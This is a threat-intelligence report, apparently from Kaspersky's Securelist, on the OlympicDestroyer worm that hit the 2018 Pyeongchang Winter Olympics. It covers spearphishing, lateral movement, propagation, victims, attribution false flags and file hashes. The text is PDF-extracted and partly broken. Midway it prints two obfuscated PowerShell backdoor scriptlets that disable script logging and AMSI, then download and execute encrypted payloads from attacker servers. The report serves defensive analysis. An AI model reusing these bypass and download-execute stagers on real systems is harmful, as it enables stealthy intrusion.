Predictions for 2017](https://securelist.com/kaspersky-security-bulletin-predictions-for-2017/76660/)_\n\n_Kaspersky Security Bulletin 2015. Overall statistics for_\n\nA couple of days after the opening ceremony of the Winter Olympics in Pyeongchang, South Korea,\n\n_2015_\n\nwe received information from several partners, on the condition of non-disclosure (TLP:Red), about a\n\n[devastating malware attack on the Olympic infrastructure. A quick peek inside the malware revealed a](https://securelist.com/threats/malware-glossary?utm_source=securelist&utm_medium=blog&utm_campaign=termin-explanation)\n\ndestructive self-modifying password-stealing self-propagating malicious program, which by any\n\ndefinition sounds pretty bad.\n\n[According to media reports, the organizers of the Pyeongchang Olympics confirmed they were](https://www.wired.com/story/olympic-destroyer-malware-pyeongchang-opening-ceremony/)\n\ninvestigating a cyberattack that temporarily paralyzed IT systems ahead of official opening\n\nceremonies, shutting down display monitors, killing Wi-Fi, and taking down the Olympics website so\n\nthat visitors were unable to print tickets. We also found other attempts to wreak havoc at companies\n\nworking closely with the Winter Olympics.\n\n## Malware features\n\nSeveral files related to the cyberattack were uploaded to VirusTotal on the day of the attack and\n\nwere quickly picked up by other security researchers. As we were researching this attack, the Cisco\n\n[Talos team published a brief description of the malware which Talos got from an undisclosed source.](https://blog.talosintelligence.com/2018/02/olympic-destroyer.html)\n\n[In their blog Talos highlighted some similarities between the attack, Netya (Expetr/NotPetya) and](https://securelist.com/expetrpetyanotpetya-is-a-wiper-not-ransomware/78902/)\n\n[BadRabbit (targeted ransomware).](https://securelist.com/bad-rabbit-ransomware/82851/)\n\n\n-----\n\nwhile we continued to discover more and more false flags and controversies in the malware.\n\nThe main malware module is a network worm that consists of multiple components, including a\n\nlegitimate PsExec tool from SysInternals’ suite, a few credential stealer modules and a wiper. From a\n\ntechnical perspective, the purpose of the malware is to deliver and start the wiper payload which\n\nattempts to destroy files on the remote network shares over the next 60 minutes. Meanwhile, the\n\nmain module collects user passwords from browser and Windows storage and crafts a new\n\ngeneration of the worm that contains old and freshly collected compromised credentials. The new\n\ngeneration of the worm is pushed to accessible local network computers and starts using the PsExec\n\ntool, leveraging the collected credentials and current user privileges.\n\nOnce the wiper has run for 60 minutes it cleans Windows event logs, resets backups, deletes shadow\n\ncopies from the file system, disables the recovery item in the Windows boot menu, disables all the\n\nservices on the system and reboots the computer. Those files on the network shares that it managed\n\nto wipe within 60 minutes remain destroyed. The malware doesn’t use any persistence and even\n\ncontains protection (also a killswitch) against recurring reinfection. Incidentally, only 1MB of the\n\nremote files are fully overwritten with zeroes; larger files were wiped with just 1K of zeroes in the\n\nheader. The local files are not destroyed and the worm doesn’t wipe itself or its components.\n\n\n-----\n\n_Fig.1 OlympicDestroyer component relations_\n\n## Reconnaissance stage\n\nSeveral companies have blogged about OlympicDestroyer’s attribution, it’s features and propagation\n\nmethod, but no one has discovered how exactly it was launched and from where. That’s where we\n\nhad a little bit more luck.\n\nSince December 2017 security researchers have been seeing samples of MS Office documents in\n\nspearphishing emails related to the Winter Olympics uploaded to VirusTotal. The documents\n\ncontained nothing but slightly formatted gibberish to make it look like the text had an encoding\n\nproblem, encouraging the user to press a button to “Enable Content”.\n\n\n-----\n\n_Fig.2 Screenshot of attachment from a spearphishing email._\n\nWhen the victim “enables content”, the document starts a cmd.exe with a command line to execute a\n\nPowerShell scriptlet that, in turn, downloads and executes a second stage PowerShell scriptlet and,\n\neventually, backdoors the system. The only apparent links between this email campaign and\n\nOlympicDestroyer would have been the target, however, we managed to discover a couple of\n\nconnections between this weaponized document and the attack in Pyeongchang which makes us\n\nbelieve they are related.\n\nFor this investigation, our analysts were provided with administrative access to one of the affected\n\nservers located in a hotel based in Pyeongchang county, South Korea. A triage analysis was\n\nconducted on this Windows server system. The affected company also kindly provided us with the\n\nnetwork connections log from their network gateway. Thanks to this, we confirmed the presence of\n\nmalicious traffic to a malicious command and control server at IP 1 31 .255.*.* which is located in\n\nArge nt ina. The infected host established multiple connections to this server on ports from the\n\nfollowing list:\n\n443\n\n4443\n\n8080\n\n8081\n\n\n-----\n\nusing a Protomail account:\n\nName: Sim o n ***\n\nEmail: sim o n***@pro t o nm ail.co m\n\nLast Login Date: 201 8-02-07 1 6:09\n\nIP Address: 82.1 02.*.* (Norway)\n\nServer purchased on: 201 7 -1 0-1 0\n\nWe were able to further connect this to a suspicious looking domain, with a registration address and\n\nphone number from Sweden:\n\nDomain: m icro so ft ******[.]co m\n\nRegistration name: Elvis ****\n\nEmail: e lvis***@m ail.co m\n\nRegistration date: 201 7 -1 1 -28\n\nBefore getting suspended in December 2017 for failing the ICANN email verification check, the\n\ndomain registration was privacy-protected. This shielded the registration data, except the DNS\n\nservers, which indicate it was purchased via MonoVM, a VPS for a bitcoin provider:\n\nName Server: monovm.earth.orderbox-dns[.]com\n\nName Server: monovm.mars.orderbox-dns[.]com\n\nName Server: monovm mercury orderbox dns[ ]com\n\n\n-----\n\n_Fig.3 Name server history for microsoft*****.com_\n\nThis email popped up as a contact detail for a small network inside the 89.21 9.*.* range that is\n\nlocated in Kaz akhst an. This is where the trail ends for now. We apologize for not disclosing the full\n\ninformation as we would like to avoid random interactions with this contact. Full information has been\n\nprovided to law enforcement agencies and customers subscribed to our APT Intel reporting service.\n\nTo manage the server in Argentina, Simon *** used the IP address in Norway (82.1 02.*.*). This is the\n\n[gateway of a VPN service known as No rdVPN (https://nordvpn.com/) that offers privacy-protected](https://nordvpn.com/)\n\nVPN services for bitcoins.\n\nIt’s not the first time the name NordVPN has cropped up in this case. We previously saw a\n\nweaponized Word document used in spearphishing emails targeting the Winter Olympics that\n\ncontained something that looked like garbage text taken from a binary object (e.g. pagefile or even\n\nraw disk). However, part of the random data included two clearly readable text strings (highlighted\n\nbelow) that made it into the document (md5: 5ba7ec869c7157efc1e52f5157705867) for no obvious\n\nreason:\n\n\n-----\n\n_Fig. 4 A reference to NordVPN openvpn config file_\n\n\n-----\n\nPowerShell backdoor found in the network of the OlympicDestroyer victim. A comparison of this\n\ncode is available below.\n\nThe PowerShell scripts listed below were used in the weaponized documents and as standalone\n\nbackdoors. As standalone fileless backdoors, they were built and obfuscated using the same tool.\n\nBoth scripts use a similar URL structure and both implement RC4 in PowerShell, as well as using a\n\nsecret key passed to the server in base64 via cookies.\n\nPo we rshe ll fo und o n\nSpe arphishing case in So ut h Ko re a\n\nOlym picDe st ro ye r vict im\n\n\n( gCi VariABLE:FzS3AV ).“VaLUE”::“e\nxpecT100cOnTiNUe”=0;\n${wC}=^&NEW–ObjecT System.Net.Webcli\nent;${u}=Mozilla/5.0 (Windows NT 6.1;W\nOW64; Trident/7.0; rv:11.0)like Gecko;\n( GCI VARiabLe:fZS3aV ).“vAlUe”::“s\neRVeRCeRTiFICaTEVALIDATIoNCALlbAck” =\n{${tRUE}};\n${wC}.“hEADERs”.Add.Invoke(User–Agen\nt,${U});\n${WC}.“PROXy”= ( variaBLe (“fX32R”\n) –VAlUeO )::“DefaultWebProxy”;\n${wc}.“pRoxY”.“CREdENtials” = ( GET\n–vaRiABle (‘hE7KU’)).“VAlue”::“dEFauLT\nNeTWOrkCREdENTIALs”;\n${K}= $XNLO::“asCiI”.GetBytes.Invok\ne(5e2988cfc41d844e2114dceb8851d0bb);\n${R}=\n{\n${D},${K}=${ArGs};\n${s}=0..255;0..255^|^&(‘%’)\n{\n${j}=(${j}+${s}[${_}]+${k}[${_}%$\n\n\nIf($PSVERsIoNTAbLe.PSVeRsIon.MAJOR –G\ne 3){$GPS=[ReF].ASSEmbly.GETTYPE(‘Syst\nem.Management.Automation.Utils’).“GeTF\nie`Ld”(‘cachedGroupPolicySettings’,‘N’\n+‘onPublic,Static’).GEtVALUe($NulL);\nIf($GPS[‘ScriptB’+‘lockLogging’]){$GP\nS[‘ScriptB’+‘lockLogging’][‘EnableScri\nptB’+‘lockLogging’]=0;\n$GPS[‘ScriptB’+‘lockLogging’][‘Enable\nScriptBlockInvocationLogging’]=0}ElSE{\n\n[ScriptBlOcK].“GeTFiE`Ld”(‘signatures’\n,‘N’+‘onPublic,Static’).SETValUE($NUlL\n,(New–ObJecT CoLLectIOnS.GeNeRIC.HAshS\net[stRing]))}[ReF].AssEmbLY.GETTYPe(‘S\nystem.Management.Automation.AmsiUtils’\n)|?{$_}|%{$_.GEtField(‘amsiInitFailed’\n,‘NonPublic,Static’).SEtVALue($nULL,$T\nRuE)};\n};\n\n[SYStem.NeT.SerVicePoinTMANAGeR]::EXP\neCt100ConTINuE=0;\n$wC=NeW–ObJect SySTem.NEt.WEBClIeNT;\n$u=‘Mozilla/5.0 (Windows NT 6.1; WOW6\n4; Trident/7.0; rv:11.0) like Gecko’;\n$Wc.HEADErS.Add(‘User-Agent’,$u);\n\n$wC.ProXY=[SYsTeM.NET.WeBREqUesT]::DE\n\n\n-----\n\n${I}=(${I}+1)%256;\n${h}=(${H}+${s}[${I}])%256;\n${S}[${I}],${s}[${H}]=${s}[${H}],\n${S}[${I}];\n${_}–BxoR${S}[(${s}[${I}]+${S}[${\nH}])%256]}\n};\n${Wc}.“hEadeRS”.Add.Invoke(cookie,se\nssion=ABWjqj0NiqToVn0TW2FTlHIAApw=);\n${SER}=https://minibo***[.]cl:443;\n${T}=/components/com_tags/controller\ns/default_tags.php;\n${dATa}=${Wc}.DownloadData.Invoke(${\nseR}+${T});\n${IV}=${DATA}[0..3];\n${dAta}=${DaTA}[4..${dAtA}.length];\n–jOin[ChaR[]](^& ${R} ${DAtA} (${IV}\n+${K}))^|.IEX &&SeT  RMN=ecHo InvoKe\n–expRESsIon ([ENVirOnMeNt]::gETeNvIro\nNMENTvarIaBlE(‘svTI’,‘procEsS’)) ^| p\nOWErshEll –NOnint –wiNdOWSt hiddeN –N\noEXiT –NoprOFilE –ExECuTiONPOLIcy bY\npASs   – && CMd.exE  /c%Rmn%\n\n## Lateral movement\n\n\n$K=[SysTEM.Text.ENcOding]::ASCII.GETB\nYTes(’94+K/L3OE?o@qRl>.:FPev7rtNb^|#im\n’);\n$R=\n{\n$D,$K=$ARgs;\n$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$\n_%$K.COuNt])%256;\n$S[$_],$S[$J]=$S[$J],$S[$_]};\n$D|%\n{\n$I=($I+1)%256;\n$H=($H+$S[$I])%256;\n$S[$I],$S[$H]=$S[$H],$S[$I];\n$_–bxor$S[($S[$I]+$S[$H])%256]\n}\n};\n$ser=‘http://131.255.*.*:8081’;\n$t=‘/admin/get.php’;\n$wc.HeAders.Add(“Cookie”,“session=zt8\nVX24Knnzen8pNvhPl1xJ2E5s=”);\n$daTA=$WC.DownlOADDATA($ser+$t);\n$iV=$DATa[0..3];\n$datA=$dATa[4..$data.leNgth];\n–joiN[CHAR[]](& $R $dAta ($IV+$K))|IE\nX\n\n\nDespite the network worm’s self-replicating feature, the attackers did some manual lateral\n\nmovement before starting on the destructive malware. We believe this was done to look for a better\n\nspot to release the worm. They seemed to be moving through the network via Psexec and stolen\n\ncredentials, opening a default meterpreter port (TCP 4444) and downloading and running a backdoor\n\n(meterpreter). The attackers also checked the network configuration, potentially searching for servers\n\nattached to multiple networks or VPN links in order to penetrate adjacent networks that could be\n\nlinked to the Olympic Committee infrastructure\n\n\n-----\n\nmovement. According to the telemetry from this host, the attackers entered the system on 6\n\nFebruary, 2018. They used three types of PowerShell scriptlets: TCP 4444 port opener, ipconfig\n\nlauncher and a downloader.\n\nBased on telemetry we received from one of the hosts, we built a timeline of the attackers’ activity\n\nand a histogram showing when the attackers started executables on the system.\n\n_Fig.5 Histogram with attacker activity per hour of day_\n\nFrom this we can see that the attackers were mostly busy outside of office hours according to\n\nKorean Standard Time (UTC+9), perhaps to attract less attention or simply due to their own\n\ntimezone.\n\n## Worm propagation\n\nOlympicDestroyer is a network worm that collects user credentials with hostnames. New data is\n\nappended to the end of an existing collection. Having multiple samples of the worm from different\n\nt k ll t t t th th f th d fi d th f di t ib ti ( t\n\n\n-----\n\n_Fig.6 OlympicDestroyer worm propagation_\n\nThe diagram above was built based on extracted lists of credentials with hostnames and some\n\nalleged roles of the servers based on respective names. We can see there were at least three\n\nindependent launch pads for the worm: Atos.net company, ski resort hotels, and the\n\nPyeongchang2018.com server.\n\nAt some point, samples with a list of credentials were uploaded to VirusTotal where they were found\n\n\n-----\n\n## Victims\n\nSpearphishing emails were used to target the networks of official partners of the Winter Olympics.\n\nThe attackers probably went to the official website to find out the names of the partner companies,\n\nfigured out their domain names, collected known email addresses and started bombarding them with\n\nspearphishes.\n\nOne of these weaponized documents was uploaded to VT from South Korea on 29 December, 2017\n\ninside an email file (6b728d2966194968d12c56f8e3691855). The sender address imitates the South\n\nKorean NCTC (National Counter-Terrorism Center), while the sender’s server IP originates from a\n\nserver in Singapore.\n\n_Fig.7 Fake sender address._\n\nThe email appears to have been sent to ice ho cke y@pye o ngchang201 8[.]co m .

Using short domain names such as sk.com or kt.com wasn’t a good idea.\n\nThis went unnoticed and a few totally unrelated companies with domain names ending with sk.com\n\nd k i d hi hi il\n\n\n-----\n\nkuhlekt .co m (Software company in Australia)\n\nwertprojekt .co m (Real estate company in Germany)\n\nBased on all the evidence we discovered, the following networks seem to have been breached in the\n\nattack:\n\nSoftware vendor responsible for automation at ski resorts\n\nTwo ski resort hotels in South Korea\n\nIT service provider (Atos.net) headquartered in France\n\ncom attached network\n\nConsidering the malware was spread as a network worm via Windows network shares, collateral\n\ndamage was inevitable. Through one of the victims who uploaded the dropper file to VT from\n\nAustria, we were able to extract the hostname from the stolen credentials stored in the malware:\n\nAT VIES 2BQA. While it may look like a random sequence of characters at first glance, we speculate\n\nthat AT stands for the host country code (Aust ria) which matches the submitter source country,\n\nfollowed by the organization name “VIES” with some extra random characters uniquely identifying the\n\nhost. According to OSINT, there is only one large organization that matches this name in Austria – the\n\nVAT Info rm at io n Exchange Syst e m used throughout the European Union. VIES is a search\n\nengine owned by the European Commission. So, it’s either a compromised host of Atos which role is\n\nto communicate with the Austrian VIES or the Austrian VIES indeed is indeed in collateral damage of\n\nthe malware’s network propagation.\n\nBut the main outbreak of the worm that we investigated was at a hotel in a South Korean winter\n\nresort. The hotel didn´t upload any samples to VT, which is why it remained unknown. We assume\n\nmany other companies attacked in South Korea did the same, which reduced the visible surface of\n\nthe attacked infrastructure.\n\nWhile we cannot name the hotel chain, we can say that one of its hotels located in a ski resort in\n\nPyeongchang was subjected to an attack. Despite the close proximity to the Olympic Games, the\n\nresort was not one of the official winter parks staging the games. However, it is definitely part of the\n\n\n-----\n\nfrom this dedicated ski resort automation server. That server was the so-called patient-zero in the\n\nnetwork. The timing was also chosen to precede the official opening ceremony by a couple of hours,\n\nallowing the worm to propagate deep enough into networks to cause maximum inconvenience for\n\nthose using the affected infrastructure. As a matter of fact, the plan was to let the worm gain better\n\nvisibility in the news.\n\n## Attribution hell\n\n[In their blog the Cisco Talos researchers also pointed out that OlympicDestroyer used similar](https://blog.talosintelligence.com/2018/02/olympic-destroyer.html)\n\ntechniques to Badrabbit and NotPetya to reset the event log and delete backups. Although the\n\nintention and purpose of both implementations of the techniques are similar, there are many\n\ndifferences in the code semantics. It’s definitely not copy-pasted code and because the command\n\nlines were publicly discussed on security blogs, these simple techniques became available to anyone\n\nwho wants to use them.\n\n\n-----\n\nSoon after the Talos publication, Israeli company IntezerLabs tweeted that they had found links to\n\nChinese APT groups.\n\n_Fig.9 Announcement of connection to Chinese APTs by IntezerLabs on 12 Feb, 2018_\n\n[IntezerLabs released a blogpost with an analysis of features found using their in-house malware](http://www.intezer.com/2018-winter-cyber-olympics-code-similarities-cyber-attacks-pyeongchang/)\n\nsimilarity technology.\n\n[A few days later media outlets started publishing articles suggesting potential motives and activities](https://www.scmagazineuk.com/2018-winter-olympics-hit-with-destroyer-malware-during-opening-ceremony/article/743928/)\n\nby Russian APT groups: “Crowdstrike Intelligence said that in November and December of 2017 it had\n\nobserved a credential harvesting operation operating in the international sporting sector. At the time\n\nit attributed this operation to Russian hacking group Fancy Bear”…”.\n\n[On the other hand, Crowdstrike’s own VP of Intelligence, Adam Meyers, in an interview with the media](https://www.scmagazineuk.com/2018-winter-olympics-hit-with-destroyer-malware-during-opening-ceremony/article/743928/)\n\nsaid: “There is no evidence connecting Fancy Bear to the Olympic attack”.\n\nHowever, a couple of weeks later, the Russian trace was brought up again by the Washington Post,\n\n[which claimed that Russian military spies were behind the Winter Olympics attack, citing “two U.S.](https://www.washingtonpost.com/world/national-security/russian-spies-hacked-the-olympics-and-tried-to-make-it-look-like-north-korea-did-it-us-officials-say/2018/02/24/44b5468e-18f2-11e8-92c9-376b4fe57ff7_story.html)\n\n\n-----\n\n_Fig.10 Microsoft security team claims they found EternalRomance in OlympicDestroyer_\n\nA couple of days later Microsoft had to retract those claims as they were simply not confirmed.\n\n\n-----\n\n[intelreports@kaspersky.com), the Cisco Talos team decided to revisit OlympicDestroyer and go](mailto:intelreports@kaspersky.com)\n\n[public with a similar review. We сan’t help but agree with this nice write-up with code comparison,](https://blog.talosintelligence.com/2018/02/who-wasnt-responsible-for-olympic.html)\n\nbecause we came to very similar conclusions.\n\nIn addition, Talos researchers noted that the evtchk.txt filename, which the malware used as a\n\npotential false-flag during its operation, was very similar to the filenames (evtdiag.exe, evtsys.exe and\n\nevtchk.bat) used by BlueNoroff/Lazarus in the Bangladesh SWIFT cyberheist in 2016.\n\n[Recorded Future decided to not attribute this attack to any actor; however, they claimed that they](https://www.recordedfuture.com/olympic-destroyer-malware/)\n\nfound similarities to BlueNoroff/Lazarus LimaCharlie malware loaders that are widely believed to be\n\nNorth Korean actors.\n\nWe can’t dispute that part of the code really does resemble the Lazarus code. The wiper modules\n\nused in OlympicDestroyer (MD5: 3c0d740347b0362331c882c2dee96dbf) and Bluenoroff (MD5:\n\n5d0ffbc8389f27b0649696f0ef5b3cfe) used similar code to wipe files.\n\n_Fig.12 Comparison of wiping module (left: Bluenoroff tool; right: OlympicDestroyer)_\n\n\n-----\n\nalso mentions a similarity in malware loader code) to protect their backdoor modules from reverse\n\nengineering as they contained some default C2 information.\n\nDespite the resemblance in the method, there are significant differences in its usage:\n\n1. Lazarus used long and reliable alphanumeric passwords (30+ characters long). OlympicDestroyer\n\non the contrary used a very simple password: “123”.\n\n2. Lazarus never hardcoded its passwords for protected payloads into the malware body.\n\nOlympicDestroyer on the contrary hardcoded it (there was actually no other way, because the\n\nworm had to spread itself and run fully autonomously). That’s why the whole idea of using\n\npassword-protected payloads in the network worm looks ridiculous, and we believe it’s unlikely an\n\nactor such as Lazarus would implement techniques like that considering their previous TTPs.\n\nThe possibility of North Korean involvement looked way off mark, especially since Kim Jong-un’s own\n\nsister attended the opening ceremony in Pyeongchang. According to our forensic findings, the attack\n\nwas started immediately before the official opening ceremony on 9 February, 2018.\n\nWhat we discovered next brought a big shock. Using our own in-house malware similarity system we\n\nhave discovered a unique pattern that linked Olympic Destroyer to Lazarus. A combination of certain\n\ncode development environment features stored in executable files, known as Rich header, may be\n\nused as a fingerprint identifying the malware authors and their projects in some cases. In case of\n\nOlympic Destroyer wiper sample analyzed by Kaspersky Lab this “fingerprint” gave a 100% match with\n\npreviously known Lazarus malware components and zero overlap with any other clean or malicious\n\nfile known to date to Kaspersky Lab.\n\nYet the motives and other inconsistencies with Lazarus TTPs made some of our researchers\n\nskeptically revisit that rare artefact. With another careful look into these evidence and manual\n\nverification of each feature we discovered that the set of features doesn’t match the actual code. At\n\nthat moment it became clear that the set of features was simply forged to perfectly match the\n\nfingerprint used by Lazarus. Considering that this is not very well explored area in malware analysis\n\nand attribution, we decided to share some more information on how we proved in a dedicate\n\n\n-----\n\n201 8-02-09 1 0:42:1 9 which is almost 2 hours after attack in Pyeongchang ski resorts started. It’s\n\nunclear what went wrong but it looks like the attackers rushed to modify the worm’s wiper\n\ncomponent, so that it immediately disabled system services and rebooted the machine instead of\n\nwaiting for 60 minutes. They seem to wanted immediate results as there were just minutes before\n\nthe official opening ceremony started.\n\nConsidering all of the above it it now looks like a very sophisticated false flag which was placed inside\n\nthe malware intentionally in order to give threat hunter impression that they found a smoking gun\n\nevidence, knocking them of the trail to the accurate attribution.\n\n## Conclusions\n\nWhat conclusions can we draw from this?\n\nIt really depends on how clever the attacker behind this campaign is.\n\nIf Lazarus was the smartest of all, then they could have crafted a sophisticated false flag that would\n\nbe hard to discover, requiring even more sophistication to prove it’s a forgery. However, the level of\n\nresearcher sophistication is something that’s difficult for attackers to gauge. The level of complexity\n\nwe’re talking about would definitely reduce reliability and couldn’t guarantee that everything went to\n\nplan. In addition, Lazarus had no rational motive to conduct this attack, not to mention TTPs that\n\nobviously weren’t theirs.\n\nSpeaking of TTPs, we have seen attackers using NordVPN and MonoVM hosting. Both services are\n\navailable for bitcoins, which make them the perfect tool for APT actors. This and several other TTPs\n\nhave in the past been used by the Sofacy APT group, a widely known Russian-language threat actor. A\n\n[year ago we published our research about the Lazarus APT group using false flags in attacks against](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180244/Lazarus_Under_The_Hood_PDF_final.pdf)\n\nbanks around the world that pointed to a Russian origin. Was it payback from Russian-speaking\n\nSofacy or was it someone else trying to frame Sofacy? The muddied waters of this case mean we are\n\n\n-----\n\nall local data they could have easily devastated the Olympic infrastructure. Instead, they decided to\n\ndo some “light” destruction: wiping files on Windows shares, resetting event logs, deleting backups,\n\ndisabling Windows services and rebooting systems into an unbootable state. When you add in the\n\nmultiple similarities to TTPs used by other actors and malware, intentional false flags and relatively\n\ngood opsec, it merely raises more questions as to the purpose of all this.\n\nAs we see it, these are some of the possible motives behind the attack:\n\n1. Demonstration of power/skills in the context of a secret communication that we’re unaware of.\n\nThe potential for full-blown, highly destructive cybersabotage might be a strong argument in top\nsecret political negotiations.\n\n2. Testing of destructive worm capability, but with lower impact to avoid too much attention from\n\npotential investigators and general public (in case of human error or operational failure).\n\n3. Trap threat intel researchers in a field of false flags and, based on their responses, learn how to\n\nimplement the perfect false flag.\n\nThe last option makes sense when you consider that the malware contained a wiper that wasn’t used\n\nto wipe its own components – the authors wanted it to be discovered.\n\nFor a powerful attacker learning how to reliably craft false flags and trick researchers into attributing\n\nthe attack to someone else can mean gaining the ultimate cover – total immunity against attribution.\n\nBut this kind of rocket science requires real-life experiments.\n\nWe think the carefully orchestrated OlympicDestroyer campaign played a very important role that will\n\nshape APT research in the future. While it didn’t fully sabotage the Winter Olympic games in\n\nPyeongchang, its effects were noticed not only in South Korea but also in Europe. Most importantly, it\n\nbrings with it a potential threat to the attribution process, undermining trust in intel research findings.\n\nThere’s a lesson to be taken from this attack that’s useful for all of us in threat intelligence – don’t\n\nrush with attribution. This is a very delicate subject that should be handled with great care. We as an\n\nindustry shouldn’t sacrifice the accuracy of our research to opportunistically promote business\n\n\n-----\n\n0311CEC923C57A435E735E106517797F\n\n104ECBC2746702FA6ECD4562A867E7FB\n\n12668F8D072E89CF04B9CBCD5A3492E1\n\n19C539FF2C50A0EFD52BB5B93D03665A\n\n221C6DB5B60049E3F1CDBB6212BE7F41\n\n3514205D697005884B3564197A6E4A34\n\n3C0D740347B0362331C882C2DEE96DBF\n\n47E67D1C9382D62370A0D71FECC5368B\n\n4C8FA3731EFD2C5097E903D50079A44D\n\n4F43F03783F9789F804DCF9B9474FA6D\n\n51545ABCF4F196095ED102B0D08DEA7E\n\n52775F24E230C96EA5697BCA79C72C8E\n\n567D379B87A54750914D2F0F6C3B6571\n\n5778D8FF5156DE1F63361BD530E0404D\n\n583F05B4F1724ED2EBFD06DD29064214\n\n58DD6099F8DF7E5509CEE3CB279D74D5\n\n59C3F3F99F44029DE81293B1E7C37ED2\n\n64AA21201BFD88D521FE90D44C7B5DBA\n\n65C024D60AF18FFAB051F97CCDDFAB7F\n\n68970B2CD5430C812BEF5B87C1ADD6EA\n\n6E0EBEEEA1CB00192B074B288A4F9CFE\n\n7C3BF9AB05DD803AC218FC7084C75E96\n\n83D8D40F435521C097D3F6F4D2358C67\n\n86D1A184850859A6A4D1C35982F3C40E\n\n[APT](https://securelist.com/all?tag=538) [BACKDOOR](https://securelist.com/all?tag=568) [MALWARE DESCRIPTION](https://securelist.com/all?tag=896) [SPEARPHISHING](https://securelist.com/all?tag=200)\n\n\nShare post on:\n\n\n[VULNERABILITIES AND EXPLOITS](https://securelist.com/all?tag=41) [WIPER](https://securelist.com/all?tag=214) [WORM](https://securelist.com/all?tag=469)   \n\n\n-----\n\n###### Your new friend, KLara Threat Landscape for Industrial Automation Systems in H2 2017\n\n##### LEAVE A REPLY\nYour email address will not be published.
